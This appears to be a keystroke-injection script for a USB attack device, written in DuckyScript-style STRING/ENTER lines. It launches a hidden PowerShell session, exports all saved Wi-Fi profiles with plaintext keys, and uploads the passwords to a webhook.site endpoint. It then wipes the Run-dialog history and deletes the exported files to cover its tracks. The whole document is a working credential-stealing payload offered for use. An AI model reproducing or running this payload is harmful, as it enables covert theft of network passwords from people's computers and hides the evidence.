STRING powershell -noexit -W hidden ; $TempDir = [System.IO.Path]::GetTempPath() ; cd $TempDir ; netsh wlan export profile key=clear ; Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS ; Invoke-WebRequest -Uri https://webhook.site/https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS ; Remove-ItemProperty -Path ‘HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU’ -Name ‘*’ -ErrorAction SilentlyContinue ; del /s/f/q Wi* ; exit
ENTER

EXIT
